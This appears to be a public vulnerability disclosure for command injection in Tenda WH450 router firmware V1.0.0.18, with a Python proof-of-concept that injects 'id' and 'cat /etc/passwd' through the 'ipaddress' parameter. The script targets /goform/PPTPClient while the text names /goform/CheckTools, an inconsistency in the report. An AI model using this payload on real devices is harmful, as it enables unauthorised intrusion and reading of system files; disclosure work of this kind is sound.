# Bug Report: Command Injection in Tenda WH450 V1.0.0.18 Router
A command injection vulnerability has been discovered in the Tenda WH450 Router firmware version V1.0.0.18. The vulnerability exists in the `/goform/CheckTools` HTTP request handler and can be exploited remotely by unauthenticated attackers to achieve arbitrary code execution or cause denial of service conditions.

## Vulnerability Details

### Product Information
- **Product**: Tenda WH450
- **Affected Version**: V1.0.0.18
- **Vulnerability Type**: Command Injection

## Description:
A command injection vulnerability exists in the HTTP request handler for the `/goform/CheckTools` endpoint. The vulnerability is triggered when processing requests containing the following parameters with excessive data lengths: `ipaddress`.

![alt text](image-1.png)
## poc
![alt text](image.png)
## Reproduce
```python
#!/usr/bin/env python3
from pwn import *
import requests

BASE_URL = "http://10.10.10.1"

def login(sess):
    login_url = BASE_URL + "/login/Auth"
    data = {
        "username": "",
        "password": "",
    }

    print("[*] logging in...")
    r = sess.post(login_url, data=data, allow_redirects=True)
    print(f"[*] final url: {r.url}")
    print(f"[*] status: {r.status_code}")

    print(f"[*] cookies after login: {sess.cookies.get_dict()}")


def send_payload(sess, payload):
    url = BASE_URL + "/goform/PPTPClient"
    print("[*] sending payload...")
    r = sess.get(url, params=payload)
    print(f"Response status code: {r.status_code}")
    print(f"Response body:\n{r.text[:500]}") 

if __name__ == "__main__":
    sess = requests.Session()

    login(sess)
    
    payload = {
        "selectcmd": "ping",
        "ipaddress": "127.0.0.1; id > /tmp/pwned; cat /etc/passwd > /tmp/passwd #",
    }

    send_payload(sess, payload)

```